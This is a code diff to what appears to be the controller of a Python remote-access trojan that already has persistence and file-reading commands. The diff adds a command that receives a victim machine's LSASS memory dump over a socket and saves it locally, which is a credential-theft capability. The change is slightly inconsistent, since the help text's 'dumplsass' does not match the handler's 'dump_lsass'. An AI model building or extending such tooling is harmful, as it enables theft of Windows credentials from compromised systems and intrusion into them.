@@ -143,6 +143,7 @@ readfile <file>           read from file
         print("======================================================")
         print(f'''
 removepersistence          remove persistence
+dumplsass                  dump lsass
         ''')
         print("======================================================")
     
@@ -396,6 +397,20 @@ removepersistence          remove persistence
 
             elif command == 'removepersistence':
                 self.result()
+
+            if command == 'dump_lsass':
+                try:
+                    with open("received_lsass.dmp", "wb") as dump_file:
+                        while True:
+                            data = client.recv(4096)
+                            if not data:
+                                break
+                            dump_file.write(data)
+                    
+                    print("LSASS dump received and saved as 'received_lsass.dmp'")
+                
+                except Exception as e:
+                    print("Failed to receive LSASS dump:", str(e))
 
             elif command == 'exit':
                 client.send(command_encrypted.encode())
